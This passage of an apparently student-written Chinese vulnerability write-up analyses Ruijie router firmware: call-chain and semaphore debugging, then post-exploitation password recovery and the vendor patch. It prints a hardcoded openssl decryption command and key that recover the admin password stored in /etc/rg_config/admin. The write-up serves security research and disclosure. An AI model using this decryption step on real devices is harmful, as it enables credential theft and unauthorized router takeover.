<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(_DWORD *)(v10 + <span class="number">4</span>) = deal_remote_config_handle;</span><br><span class="line"><span class="keyword">if</span> ( create_thread(v10) )</span><br></pre></td></tr></table></figure>

<p>所以判断 <code>deal_remote_config_handle</code> 函数是在 <code>uf_cmd_task_init</code> 新创建的线程中当做入口函数来执行的</p>
<h3 id="用户没有传入数据时，进程在哪里被阻塞了？"><a href="#用户没有传入数据时，进程在哪里被阻塞了？" class="headerlink" title="用户没有传入数据时，进程在哪里被阻塞了？"></a>用户没有传入数据时，进程在哪里被阻塞了？</h3><p>在 <code>IDA</code> 中有如下代码，这里从其他进程中读取了用户输入的数据，如果在 <code>uf_socket_msg_read</code> 函数执行前后分别打下断点的话，按几次 <code>c</code> 后发现，调试界面就会卡到 <code>uf_socket_msg_read</code> 函数执行后的界面</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v51 = (_DWORD *)uf_socket_msg_read(*v29, v31 + <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>我最初一直以为是 <code>uf_socket_msg_read</code> 函数如果没有接收到数据，就会阻塞，直到接收新的数据。但这样的话，应该是卡到了 <code>uf_socket_msg_read</code> 函数执行时，并非是卡到了 <code>uf_socket_msg_read</code> 函数执行后。卡到了执行后其实就是卡到的是下一次 <code>uf_socket_msg_read</code> 函数执行前。因此就推翻了我原先的认知，为了寻找具体是哪里将进程阻塞，我下了大量的断点，逐步缩小范围，最终找到了 <code>while ( select(fbss + 1, g_fd_set, 0, 0, 0) &lt;= 0 );</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">select</span><span class="params">(<span class="type">int</span> nfds, fd_set *readfds, fd_set *writefds,fd_set *exceptfds, <span class="keyword">struct</span> timeval *timeout)</span>;</span><br></pre></td></tr></table></figure>

<p><code>select</code> 函数允许程序监视多个文件描述符，等待所监视的一个或者多个文件描述符变为 <strong>“准备就绪”</strong> 的状态。所谓的 <strong>”准备就绪“</strong> 状态是指：文件描述符不再是阻塞状态，可以用于某类IO操作了，包括可读，可写，发生异常三种。在 <code>select</code> 函数调用之后，如果返回值大于 <code>0</code> ，表示至少有一个文件描述符 <strong>“准备就绪”</strong> ，程序中的 <code>select</code> 函数监视的是是否有文件描述符变成可读（也就是有数据可以读取），如果 <code>timeout == NULL</code> ，会无期限的等待下去，这个等待可以被一个信号中断，只有当一个描述符准备好，或者捕获到一个信号时函数才会返回。如果是捕获到信号，<code>select</code> 返回 <code>-1</code> ，并将变量<code>errno</code> 设置成 <code>EINTR</code> 。</p>
<p>验证的话，只需要在 <code> select(fbss + 1, g_fd_set, 0, 0, 0)</code> 代码执行前后打上断点，发现确实卡在了 <code>select</code> 函数执行时，当用户发送报文后，代码就可以继续往后执行了，因为 <code>select</code> 函数已经确定了有文件描述符变成了可读，所以后面的 <code>uf_socket_msg_read</code> 函数可以顺利接收到用户传入的数据。至此确定卡住进程的并不是 <code>uf_socket_msg_read</code> 函数，而是 <code>select</code> 函数</p>
<h3 id="从deal-remote-config-handle函数如何执行到uf-cmd-call函数"><a href="#从deal-remote-config-handle函数如何执行到uf-cmd-call函数" class="headerlink" title="从deal_remote_config_handle函数如何执行到uf_cmd_call函数"></a>从deal_remote_config_handle函数如何执行到uf_cmd_call函数</h3><p>我把 <code>uf_cmd_call</code> 函数当做正式调用链的入口，通过调试可以得知 <code>uf_cmd_call</code> 函数是在 <code>deal_remote_config_handle</code> 中被调用的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291028707.png" alt="image-20230829102836486"></p>
<p>但这里并非是顺序执行代码，正常触发 <code>uf_cmd_call</code> </p>
<p><code>deal_remote_config_handle</code> 函数刚执行时就会在下面的循环卡住</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">16</span>) = <span class="number">0</span>;</span><br><span class="line">  v3 = uf_task_remote_pop_queue();</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">16</span>) = v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( !v3 );</span><br></pre></td></tr></table></figure>



<p><code>uf_task_remote_pop_queue</code> 函数开始执行了 <code>sem_wait(&amp;unk_435E90)</code> ，这里表示在等待一个信号量，如果信号量的值大于零，则将信号量的值减一，然后继续执行；如果信号量的值为零，则进程（或线程）将被阻塞，直到信号量的值大于零。通过调试的话能发现，实际造成线程卡住的代码就是 <code>sem_wait</code> ，这就说明肯定有一个地方还没有触发相应信号量的 <code>sem_post</code> 操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">uf_task_remote_pop_queue</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// $s0</span></span><br><span class="line"></span><br><span class="line">  sem_wait(&amp;unk_435E90);</span><br><span class="line">  pthread_mutex_lock(&amp;unk_435E74);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span> *)cmd_task_remote_head == &amp;cmd_task_remote_head )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v0 = cmd_task_remote_head - <span class="number">4</span>;</span><br><span class="line">    sub_40B620((_DWORD *)cmd_task_remote_head);</span><br><span class="line">  &#125;</span><br><span class="line">  pthread_mutex_unlock(&amp;unk_435E74);</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>接下来对信号量进行交叉引用，<code>sub_40B0B0</code> 中确实是一个 <code>sem_post(&amp;unk_435E90)</code> 的操作，然后 <code>uf_task_remote_pop_queue</code> 也就是下图的位置 <code>sem_wait(&amp;unk_435E90)</code>，最后的 <code>uf_cmd_task_init</code> 函数中是 <code>sem_init(&amp;unk_435E90, 0, 0)</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291044499.png" alt="image-20230829104446429"></p>
<p>根据上面的分析可知，只有 <code>sub_40B0B0</code> 函数存在 <code>sem_post(&amp;unk_435E90)</code> ，因此下面要追踪 <code>sub_40B0B0</code> 函数的调用链，对其交叉引用发现在 <code>sub_40B304</code> 函数进行了调用</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291048141.png" alt="image-20230829104848068" style="zoom:67%;" />

<p>至此都是正常的分析思路，接下来应该继续对 <code>sub_40B304</code> 函数进行交叉引用，但这里 <code>IDA</code> 就对我的分析产生了误导，通过下图得知，应该是只有一个叫做 <code>uf_lock_cmd_pop_all</code> 的函数调用了 <code>sub_40B304</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291052228.png" alt="image-20230829105258147"></p>
<p>查看 <code>uf_lock_cmd_pop_all</code> 函数代码，发现确实是进行了调用</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291054903.png" alt="image-20230829105440844"></p>
<p>但如果继续跟 <code>uf_lock_cmd_pop_all</code> 这条链的话，最后就发现这条链在 <code>main</code> 函数的触发太靠前了，实际上改变信号量触发 <code>uf_cmd_call</code> 的操作一定是要在接收用户数据之后做的。并且可以用 <code>gdb</code> 验证，只需要在 <code>sub_40B0B0</code> 函数下一个断点，在 <code>uf_lock_cmd_pop_all</code> 函数下一个断点，最后发现程序没有在 <code>uf_lock_cmd_pop_all</code> 函数处断下来，而在 <code>sub_40B0B0</code> 断下来了。</p>
<p>因此得出结论，<strong>除去 <code>uf_lock_cmd_pop_all</code> 函数，一定还有一条链也可以触发 <code>sub_40B0B0</code> 函数，而这个链通过 <code>IDA</code> 的交叉引用并没有看到</strong> （在实际我分析这里时，我其实分析和调试了很久才做出了这个判断，因为有怀疑过 <code>gdb</code> 的 <code>bug</code>，有怀疑过是我调用链没分析明白，但最后通过分析和调试逐一排除了这些推断）也有一点运气使然，我后续无意翻看代码时，在位于 <code>add_pkg_cmd2_task</code> 函数中，我看到了 <code>sub_40B304</code> 函数，该函数是 <code>sub_40B0B0</code> 上级函数。</p>
<p>因此还有一条链也能改变信号量，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">main =&gt; add_pkg_cmd2_task =&gt; sub_40B304 =&gt; sub_40B0B0 =&gt; sem_post(&amp;unk_435E90)</span><br></pre></td></tr></table></figure>

<p>能发现这条链的原因有三个，第一是这条调用链不深（如果 <code>add_pkg_cmd2_task</code> 函数调用了三四层函数才到 <code>sub_40B304</code> ，大概率也很难找到），第二是我当时将函数重命名了（我写本文的时候将 <code>sub_40B304</code> <code>sub_40B0B0</code> 函数改回了 <code>IDA</code> 默认的名称，不过在我分析的时候，我对这些关键的调用函数都做了重命名，可以一眼看到这类函数，否则用默认名字，长的差不多的情况下，也不一定能注意到），第三是坚持（这个调用链的问题，我整整分析了一天，虽然结论只是 <code>IDA</code> 有点问题，但这个误导以及摆脱误导的过程是困难且有意义的，如果不是 <strong>winmt</strong> 师傅让我对细节的坚持，或许我早已放弃这一个小小的信号量分析）</p>
<h3 id="scp命令报错解决"><a href="#scp命令报错解决" class="headerlink" title="scp命令报错解决"></a>scp命令报错解决</h3><p>在使用 <code>scp</code> 命令传输的时候，报错如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  204 sudo scp squashfs-root.tar.gz root@192.168.45.66:/root/204.tar.gz</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!</span><br><span class="line">Someone could be eavesdropping on you right now (man-in-the-middle attack)!</span><br><span class="line">It is also possible that a host key has just been changed.</span><br><span class="line">The fingerprint for the RSA key sent by the remote host is</span><br><span class="line">SHA256:tVc2ekHlAJNyIu0Fo9rOvfudWIVfkMpa3FSLlDcGeVQ.</span><br><span class="line">Please contact your system administrator.</span><br><span class="line">Add correct host key in /root/.ssh/known_hosts to get rid of this message.</span><br><span class="line">Offending RSA key in /root/.ssh/known_hosts:6</span><br><span class="line">  remove with:</span><br><span class="line">  ssh-keygen -f &quot;/root/.ssh/known_hosts&quot; -R &quot;192.168.45.66&quot;</span><br><span class="line">RSA host key for 192.168.45.66 has changed and you have requested strict checking.</span><br><span class="line">Host key verification failed.</span><br><span class="line">lost connection</span><br></pre></td></tr></table></figure>

<p>产生这个错误的原因是因为 <code>SSH</code> 密钥认证的安全机制， <code>SSH</code> 使用密钥来确保通信的安全性和身份认证，每台 <code>SSH</code> 服务器都有一个公钥和私钥。当第一次连接到 <code>SSH</code> 服务器上时，服务器会生成一对密钥，将公钥发给客户端，这个公钥会保存在客户端本地的 <code>known_hosts</code> 文件中，当以后连接到同一个服务器的时候，客户端会检查服务器发送过来的公钥是否和 <code>known_hosts</code> 文件中的公钥匹配，如果匹配，连接就会被建立，如果不匹配（可能受到了中间人攻击或者服务器密钥已更改），就会出现如上报错。</p>
<p>解决方法：执行 <code>ssh-keygen -f &quot;/root/.ssh/known_hosts&quot; -R &quot;192.168.45.66&quot;</code> 命令，它将删除 <code>known_hosts</code> 文件中与服务器 <code>IP</code> 地址 <code>192.168.45.66</code> 相关的密钥记录。然后重新执行 <code>scp</code> 命令进行文件传输，这样 <code>SSH</code> 客户端会检测到新的主机密钥，并将其添加到已知主机列表中（<code>known_hosts</code> 文件）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308251011899.png" alt="image-20230825101111496" style="zoom:67%;" />





<h2 id="后续利用"><a href="#后续利用" class="headerlink" title="后续利用"></a>后续利用</h2><p>拿到路由器的最高权限后，也有一些后续的利用。比如拿管理员后台密码，劫持流量（抓取未加密的数据），修改 <code>ARP</code> 缓存表等等。因为本人只是一个正在学习相关知识的学生，对大部分的利用并不成熟，目前只记录拿到管理员后台密码的分析，后续如果有其他方面的进展，也会将细节进行补充</p>
<h3 id="拿到管理员后台密码"><a href="#拿到管理员后台密码" class="headerlink" title="拿到管理员后台密码"></a>拿到管理员后台密码</h3><p>在登录锐捷管理员后台的时候随便输入一个密码，点击登录</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309091227332.png" alt="image-20230909122721847"></p>
<p>用 <code>Burp</code> 拦截请求，发现下面的报文中 <code>method</code> 为 <code>login</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309091231861.png" alt="image-20230909123105750"></p>
<p>这里的路径为 <code>/api/auth</code> ，根据代码 <code> entry(&#123;&quot;api&quot;, &quot;auth&quot;&#125;, call(&quot;rpc_auth&quot;), nil).sysauth = false</code> 可知会触发 <code>rpc_auth</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rpc_auth</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> jsonrpc = <span class="built_in">require</span> <span class="string">&quot;luci.utils.jsonrpc&quot;</span></span><br><span class="line">    <span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line">    <span class="keyword">local</span> ltn12 = <span class="built_in">require</span> <span class="string">&quot;luci.ltn12&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _tbl = <span class="built_in">require</span> <span class="string">&quot;luci.modules.noauth&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">tonumber</span>(http.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_CONTENT_LENGTH&quot;</span>) <span class="keyword">or</span> <span class="number">0</span>) &gt; <span class="number">1000</span> <span class="keyword">then</span></span><br><span class="line">        http.prepare_content(<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">        <span class="comment">-- http.write(&#123;code = &quot;1&quot;, err = &quot;too long data&quot;&#125;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;too long data&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    http.prepare_content(<span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">    ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.<span class="built_in">write</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>在 <code>jsonrpc.handle(_tbl, http.source())</code> 代码中，会根据 <code>method</code> 的值调用 <code>noauth.lua</code> 文件中对应的函数（具体的调用链参考上文 <a href="##lua%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90">lua文件代码分析</a>），这里就会调用 <code>login</code>  函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> disp = <span class="built_in">require</span>(<span class="string">&quot;luci.dispatcher&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> common = <span class="built_in">require</span>(<span class="string">&quot;luci.modules.common&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span>(<span class="string">&quot;luci.utils.tool&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> params.password <span class="keyword">and</span> tool.includeXxs(params.password) <span class="keyword">then</span></span><br><span class="line">        tool.eweblog(<span class="string">&quot;INVALID DATA&quot;</span>, <span class="string">&quot;LOGIN FAILED&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> authOk</span><br><span class="line">    <span class="keyword">local</span> ua = <span class="built_in">os</span>.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_USER_AGENT&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;unknown brower (ua is nil)&quot;</span></span><br><span class="line">    tool.eweblog(ua, <span class="string">&quot;LOGIN UA&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> checkStat = &#123;</span><br><span class="line">        password = params.password,</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span>, <span class="comment">-- params.username,</span></span><br><span class="line">        encry = params.encry,</span><br><span class="line">        limit = params.limit</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">local</span> authres, reason = tool.checkPasswd(checkStat)</span><br><span class="line">    <span class="keyword">local</span> log_opt = &#123;username = params.username, level = <span class="string">&quot;auth.notice&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> authres <span class="keyword">then</span></span><br><span class="line">        authOk = disp.writeSid(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">        <span class="comment">-- 手动登录时设置时间</span></span><br><span class="line">        <span class="keyword">if</span> params.<span class="built_in">time</span> <span class="keyword">and</span> <span class="built_in">tonumber</span>(params.<span class="built_in">time</span>) <span class="keyword">then</span></span><br><span class="line">            common.setSysTime(&#123;<span class="built_in">time</span> = params.<span class="built_in">time</span>&#125;)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        log_opt.action = <span class="string">&quot;login-success&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        log_opt.action = <span class="string">&quot;login-fail&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    tool.write_log(log_opt)</span><br><span class="line">    <span class="keyword">return</span> authOk</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>上面的代码中，我们关注下检查密码的函数 <code>checkPasswd</code> （它的参数是一个叫做 <code>checkStat</code> 的表，其中包含了前端传入的加密后的密码），该函数定义在 <code>luci/utils/tool</code> 文件中</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 检测密码是否正确</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPasswd</span><span class="params">(checkStat)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span>(<span class="string">&quot;luci.modules.cmd&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> _data = &#123;</span><br><span class="line">        <span class="built_in">type</span> = checkStat.encry <span class="keyword">and</span> <span class="string">&quot;enc&quot;</span> <span class="keyword">or</span> <span class="string">&quot;noenc&quot;</span>,</span><br><span class="line">        password = checkStat.password,</span><br><span class="line">        name = checkStat.username,</span><br><span class="line">        limit = checkStat.limit <span class="keyword">and</span> <span class="string">&quot;true&quot;</span> <span class="keyword">or</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">local</span> _check = cmd.devSta.get(&#123;<span class="built_in">module</span> = <span class="string">&quot;adminCheck&quot;</span>, device = <span class="string">&quot;pc&quot;</span>, data = _data&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(_check) == <span class="string">&quot;table&quot;</span> <span class="keyword">and</span> _check.result == <span class="string">&quot;success&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>, _check.reason</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>关键触发点是 <code>cmd.devSta.get(&#123;module = &quot;adminCheck&quot;, device = &quot;pc&quot;, data = _data&#125;)</code> </p>
<p>从 <code>lua</code> 文件中的代码 <code>cmd.devSta.get(&#123;module = &quot;adminCheck&quot;, device = &quot;pc&quot;, data = _data&#125;)</code> 执行后，会走到 <code>unifyframe-sgi.elf</code> 文件中，最后将 <code>/usr/sbin/module_call get adminCheck</code> 命令执行（这里的 <code>a1[5]</code> 代表操作符 <code>get</code>，<code>(v67+8)</code> 是<code>module</code> 字段的值 <code>adminCheck</code> ）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">        v70 = <span class="built_in">snprintf</span>(v66, v68, <span class="string">&quot;/usr/sbin/module_call %s %s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)a1[<span class="number">5</span>], (<span class="type">const</span> <span class="type">char</span> *)(v67 + <span class="number">8</span>));</span><br><span class="line">        v71 = (<span class="type">const</span> <span class="type">char</span> *)a1[<span class="number">20</span>];</span><br><span class="line">        v72 = &amp;v66[v70];</span><br><span class="line">        <span class="keyword">if</span> ( v71 )</span><br><span class="line">          v72 += <span class="built_in">snprintf</span>(&amp;v66[v70], v68, <span class="string">&quot; &#x27;%s&#x27;&quot;</span>, v71);</span><br><span class="line">        v73 = a1[<span class="number">21</span>];</span><br><span class="line">        <span class="keyword">if</span> ( v73 )</span><br><span class="line">          <span class="built_in">snprintf</span>(v72, v68, <span class="string">&quot; %s&quot;</span>, v73);</span><br><span class="line">......</span><br><span class="line">ufm_commit_add(<span class="number">0</span>, v66, <span class="number">1u</span>, <span class="number">0</span>)<span class="comment">//然后切换到其他线程上将 v66 命令给执行</span></span><br></pre></td></tr></table></figure>



<p>下面来分析 <code>/usr/sbin/module_call</code> 文件代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">ROM_AC_CONFIG_DIR=&quot;/rom/etc/rg_config/global/&quot;</span><br><span class="line">ROM_DEV_CONFIG_DIR=&quot;/rom/etc/rg_config/single/&quot;</span><br><span class="line">RG_CONFIG_TMP_DIR=&quot;/tmp/rg_config/&quot;</span><br><span class="line">cmd=&quot;$1&quot;</span><br><span class="line">module=&quot;$2&quot;</span><br><span class="line">param=&quot;$3&quot;</span><br><span class="line">path=&quot;$4&quot;</span><br><span class="line">register_module() &#123;</span><br><span class="line">    local module=$1</span><br><span class="line">    local module_file</span><br><span class="line">    </span><br><span class="line">    module_file=&quot;/usr/bin/$module&quot;</span><br><span class="line">    if [ -f &quot;$module_file&quot; ]; then</span><br><span class="line">        . &quot;$module_file&quot;</span><br><span class="line">    else</span><br><span class="line">        return 1</span><br><span class="line">    fi</span><br><span class="line">    return 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init() &#123;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">get_default() &#123;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">register_module &quot;$module&quot;</span><br><span class="line">if [ $? = 1 ]; then</span><br><span class="line">    return 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">for arg in $* ;do</span><br><span class="line">    if [ &quot;$arg&quot; == &quot;-n&quot; ];then</span><br><span class="line">        not_change_configId=$arg</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">case &quot;$cmd&quot; in</span><br><span class="line">    set|add|del|update|apply) $&#123;module&#125;_$&#123;cmd&#125; &quot;$&#123;param&#125;&quot; &quot;$path&quot; &quot;$&#123;not_change_configId&#125;&quot; 2&gt; /dev/null;;</span><br><span class="line">    getDefault)    get_default &quot;$module&quot; &quot;$param&quot;;;</span><br><span class="line">    get)  $&#123;module&#125;_get &quot;$&#123;param&#125;&quot;;;</span><br><span class="line">    *)      ;;</span><br><span class="line">esac</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>cmd=&quot;$1&quot;</code> <code>module=&quot;$2&quot;</code> 这里将字符串 <code>get</code> 和 <code>adminCheck</code> 分别赋给了 <code>cmd</code> <code>module</code> 变量</p>
<p>首先执行了 <code>register_module &quot;$module&quot;</code> ，简单分析一下 <code>register_module</code> 可知其在判断 <code>/usr/bin/adminCheck</code> 文件是否存在，如果不存在的话 <code>module_call</code> 文件的执行就结束了，存在的话对 <code>/usr/bin/adminCheck</code> 模块进行加载（将该文件中的代码合并到当前 <code>shell</code> 进程中，从而加载了函数和变量）</p>
<p>随后调用了 <code>for</code> 循环，来遍历脚本的命令行参数是否有 <code>-n</code> （当前分析的这个链并没有），最终关键代码为下面的 <code>case</code> 语句，如果匹配到了 <code>set</code>  <code>add </code> <code>del</code> <code>update</code> <code>appley</code> 中的任何一个，就会执行 <code>$&#123;module&#125;_$&#123;cmd&#125; &quot;$&#123;param&#125;&quot; &quot;$path&quot; &quot;$&#123;not_change_configId&#125;&quot; 2&gt; /dev/null</code> 也就是 <code>adminCheck_get 2&gt; /dev/null</code> </p>
<p><code>adminCheck_get</code> 为 <code>/usr/bin/adminCheck</code> 文件中的函数，主要作用是调用了函数 <code>adminCheck_parse</code> ，其关键的代码部分如下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">json_get_var password &quot;password&quot;</span><br><span class="line">......</span><br><span class="line">local ciphertext=$(cat /etc/rg_config/admin)	</span><br><span class="line">local passwd_old=`deenc &quot;$ciphertext&quot;`</span><br><span class="line">......</span><br><span class="line">if [ &quot;$passwd_old&quot; = &quot;$password&quot; ]</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">deenc()</span><br><span class="line">&#123;</span><br><span class="line">	local passwd=$1</span><br><span class="line">	echo &quot;$passwd&quot;| /usr/sbin/rg_crypto dec -t C</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过上面的代码可知，管理员后台密码加密后存放在 <code>/etc/rg_config/admin</code> 文件中，直接执行 <code>echo &quot;$passwd&quot;| /usr/sbin/rg_crypto dec -t C</code> 命令就能得到解密后的管理员后台密码。</p>
<p>下面用真机演示一下（我用的设备型号是 <code>EW1200G-PRO</code> ，软件版本是 <code>EW_3.0(1)B11P25,Release(07162402)</code>） ，我看了一下这个 <code>/usr/bin/adminCheck</code> 的文件，发现它的解密和上面并不一样，这里执行的应该是 <code>echo &quot;$passwd&quot;| openssl enc -aes-256-cbc -d -a -k &quot;RjYkhwzx\$2018!&quot;</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121052534.png" alt="image-20230912105245882"></p>
<p>最后执行命令如下，得到管理员密码为 <code>88888888</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121055168.png" alt="image-20230912105533075"></p>
<h2 id="补丁："><a href="#补丁：" class="headerlink" title="补丁："></a>补丁：</h2><p>官方在 <code>EW_3.0(1)B11P226</code> 版本，对上述漏洞发布了补丁   <a href="https://www.ruijie.com.cn/fw/rj/92255/">https://www.ruijie.com.cn/fw/rj/92255/</a></p>
<p>新添加了一个 <code>detect_remoteIp_invalid</code> 函数，该函数检查了 <code>remoteIP</code> 字段是否为纯数字或者字符 <code>.</code> ，因为正常的 <code>IP</code> 应该为 <code>xx.xx.xx.xx</code> 。这相当于对命令注入的字段做了一个过滤</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">detect_remoteIp_invalid</span><span class="params">(<span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> len; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $v1</span></span><br><span class="line"></span><br><span class="line">  len = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  v3 = buf;</span><br><span class="line">  v4 = &amp;buf[len];</span><br><span class="line">  <span class="keyword">while</span> ( v3 != v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = *v3;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(v5 - <span class="number">48</span>) &lt; <span class="number">0xA</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++v3;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="string">&#x27;.&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        uf_log_printf(</span><br><span class="line">          uf_log,</span><br><span class="line">          <span class="string">&quot;ERROR (%s %s %d)invalid char: %c, need [number][.][number]!&quot;</span>,</span><br><span class="line">          <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">          <span class="string">&quot;detect_remoteIp_invalid&quot;</span>,</span><br><span class="line">          <span class="number">273</span>,</span><br><span class="line">          v5);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







